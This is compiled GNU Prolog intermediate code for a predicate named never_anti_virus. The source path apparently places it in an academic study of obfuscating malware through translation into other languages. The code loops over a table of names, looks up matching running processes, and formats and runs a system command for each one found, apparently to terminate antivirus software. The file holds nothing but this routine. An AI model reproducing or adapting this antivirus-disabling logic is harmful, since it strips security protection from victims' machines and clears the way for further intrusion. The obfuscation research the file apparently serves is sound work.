

pl_code global X0_never_anti_virus__a1
	move       X(0),X(1)
	call_c     Pl_Set_Bip_Name_Untagged_2(at(3),2)
	call_c     fast Pl_Put_Integer_Tagged(-2147483645)
	move_ret   X(0)
	pl_jump    X0_loop__a2


pl_code global X0_loop__a2
	call_c     fast Pl_Create_Choice_Point2(&Lpred2_1)
	call_c     fast Pl_Allocate(4)
	move       X(0),Y(0)
	move       X(1),Y(1)
	call_c     Pl_Set_Bip_Name_Untagged_2(at(3),2)
	call_c     fast Pl_Math_Load_Value(Y(1),&X(0))
	call_c     fast Pl_Math_Load_Value(Y(0),&X(1))
	call_c     fast Pl_Put_Integer_Tagged(-2147483629)
	move_ret   X(2)
	call_c     fast Pl_Fct_Mul(X(1),X(2))
	move_ret   X(1)
	call_c     fast Pl_Fct_Add(X(0),X(1))
	move_ret   X(0)
	call_c     fast Pl_Put_Y_Variable(&Y(2))
	move_ret   X(1)
	pl_call    X0_string_ptr_dereference__a2
	call_c     Pl_Set_Bip_Name_Untagged_2(at(5),2)
	call_c     fast Pl_Math_Load_Value(Y(2),&X(0))
	call_c     fast Pl_Put_Integer_Tagged(-2147483645)
	move_ret   X(1)
	call_c     fast Pl_Blt_Neq(X(0),X(1))
	fail_ret   
	move       Y(2),X(0)
	call_c     fast Pl_Put_Y_Variable(&Y(3))
	move_ret   X(1)
	pl_call    X0_findprocessid_wrapper__a2
	move       Y(3),X(0)
	pl_call    X1_246C6F6F702F325F2461757831__a1
	call_c     Pl_Set_Bip_Name_Untagged_2(at(3),2)
	call_c     fast Pl_Math_Load_Value(Y(0),&X(0))
	call_c     fast Pl_Fct_Inc(X(0))
	move_ret   X(0)
	move       Y(1),X(1)
	call_c     fast Pl_Deallocate()
	pl_jump    X0_loop__a2

Lpred2_1:
	call_c     fast Pl_Delete_Choice_Point2()
	call_c     fast Pl_Allocate(0)
	call_c     Pl_Set_Bip_Name_Untagged_2(at(3),2)
	call_c     fast Pl_Math_Load_Value(X(1),&X(1))
	call_c     fast Pl_Math_Load_Value(X(0),&X(0))
	call_c     fast Pl_Put_Integer_Tagged(-2147483629)
	move_ret   X(2)
	call_c     fast Pl_Fct_Mul(X(0),X(2))
	move_ret   X(0)
	call_c     fast Pl_Fct_Add(X(1),X(0))
	move_ret   X(0)
	call_c     fast Pl_Put_X_Variable()
	move_ret   X(1)
	pl_call    X0_string_ptr_dereference__a2
	call_c     fast Pl_Put_Structure_Tagged(fn(0))
	move_ret   X(0)
	call_c     fast Pl_Unify_Void(1)
	call_c     fast Pl_Unify_Integer_Tagged(-2147483645)
	fail_ret   
	call_c     fast Pl_Deallocate()
	pl_jump    X1_5C5C2B__a1


pl_code local X1_246C6F6F702F325F2461757831__a1
	call_c     fast Pl_Create_Choice_Point1(&Lpred3_1)
	call_c     fast Pl_Allocate(1)
	call_c     Pl_Set_Bip_Name_Untagged_2(at(5),2)
	call_c     fast Pl_Math_Load_Value(X(0),&X(1))
	call_c     fast Pl_Put_Integer_Tagged(-2147483645)
	move_ret   X(2)
	call_c     fast Pl_Blt_Neq(X(1),X(2))
	fail_ret   
	call_c     fast Pl_Put_Y_Variable(&Y(0))
	move_ret   X(1)
	pl_call    X0_sprintf_wrapper__a2
	call_c     fast Pl_Put_Unsafe_Value(Y(0))
	move_ret   X(0)
	call_c     fast Pl_Deallocate()
	pl_jump    X0_system_wrapper__a1

Lpred3_1:
	call_c     fast Pl_Delete_Choice_Point1()
	pl_jump    X0_nl__a0


pl_code global X0_findprocessid_wrapper__a2
	call_c     Pl_Set_C_Bip_Name("findprocessid_wrapper",2)
	call_c     Pl_Rd_String_Check(X(0))
	move_ret   FL(0)
	call_c     Pl_Check_For_Un_Integer(X(1))
	call_c     findprocessid_wrapper(FL(0),&FL(1))
	fail_ret   
	call_c     Pl_Un_Integer(FL(1),X(1))
	fail_ret   
	pl_ret     


pl_code global X0_string_ptr_dereference__a2
	call_c     Pl_Set_C_Bip_Name("string_ptr_dereference",2)
	call_c     Pl_Rd_Float_Check(X(0))
	move_ret   FD(0)
	call_c     Pl_Check_For_Un_String(X(1))
	call_c     string_ptr_dereference(FD(0),&FL(1))
	fail_ret   
	call_c     Pl_Un_String(FL(1),X(1))
	fail_ret   
	pl_ret     


pl_code global X0_sprintf_wrapper__a2
	call_c     Pl_Set_C_Bip_Name("sprintf_wrapper",2)
	call_c     Pl_Rd_Integer_Check(X(0))
	move_ret   FL(0)
	call_c     Pl_Check_For_Un_String(X(1))
	call_c     sprintf_wrapper(FL(0),&FL(1))
	fail_ret   
	call_c     Pl_Un_String(FL(1),X(1))
	fail_ret   
	pl_ret     


pl_code global X0_system_wrapper__a1
	call_c     Pl_Set_C_Bip_Name("system_wrapper",1)
	call_c     Pl_Rd_String_Check(X(0))
	move_ret   FL(0)
	call_c     system_wrapper(FL(0))
	fail_ret   
	pl_ret     


pl_code global X0_char_ptr_dereference__a2
	call_c     Pl_Set_C_Bip_Name("char_ptr_dereference",2)
	call_c     Pl_Rd_Float_Check(X(0))
	move_ret   FD(0)
	call_c     Pl_Check_For_Un_Char(X(1))
	call_c     char_ptr_dereference(FD(0),&FL(1))
	fail_ret   
	call_c     Pl_Un_Char(FL(1),X(1))
	fail_ret   
	pl_ret     


pl_code local ensure_linked
	pl_jump    X1_24666F7263655F666F726569676E5F6C696E6B__a0


long local at(12)
long local fn(1)


c_code  initializer Object_Initializer

	call_c     Pl_New_Object(&Prolog_Object_Initializer,&System_Directives,&User_Directives)
	c_ret      


c_code  local Prolog_Object_Initializer

	call_c     Pl_Create_Atom("$loop/2_$aux1")
	move_ret   at(6)
	call_c     Pl_Create_Atom("/home/yufeijiang/Dropbox/security thursday/multilingual obfuscation/babel/evaluation/hunacha/hunatcha/translation/neverantivirus.pl")
	move_ret   at(0)
	call_c     Pl_Create_Atom("=\\=")
	move_ret   at(5)
	call_c     Pl_Create_Atom("char_ptr_dereference")
	move_ret   at(11)
	call_c     Pl_Create_Atom("findprocessid_wrapper")
	move_ret   at(7)
	call_c     Pl_Create_Atom("is")
	move_ret   at(3)
	call_c     Pl_Create_Atom("loop")
	move_ret   at(4)
	call_c     Pl_Create_Atom("never_anti_virus")
	move_ret   at(1)
	call_c     Pl_Create_Atom("sprintf_wrapper")
	move_ret   at(9)
	call_c     Pl_Create_Atom("string_ptr_dereference")
	move_ret   at(8)
	call_c     Pl_Create_Atom("system_wrapper")
	move_ret   at(10)
	call_c     Pl_Create_Atom("user")
	move_ret   at(2)
	call_c     fast Pl_Create_Functor_Arity_Tagged("=\\=",2)
	move_ret   fn(0)

	call_c     fast Pl_Create_Pred(at(1),1,at(0),7,129,&X0_never_anti_virus__a1)

	call_c     fast Pl_Create_Pred(at(4),2,at(0),9,129,&X0_loop__a2)

	call_c     fast Pl_Create_Pred(at(6),1,at(0),9,1,&X1_246C6F6F702F325F2461757831__a1)

	call_c     fast Pl_Create_Pred(at(7),2,at(0),1,129,&X0_findprocessid_wrapper__a2)

	call_c     fast Pl_Create_Pred(at(8),2,at(0),2,129,&X0_string_ptr_dereference__a2)

	call_c     fast Pl_Create_Pred(at(9),2,at(0),3,129,&X0_sprintf_wrapper__a2)

	call_c     fast Pl_Create_Pred(at(10),1,at(0),4,129,&X0_system_wrapper__a1)

	call_c     fast Pl_Create_Pred(at(11),2,at(0),5,129,&X0_char_ptr_dereference__a2)
	c_ret      

c_code  local System_Directives

	c_ret      

c_code  local User_Directives

	c_ret      
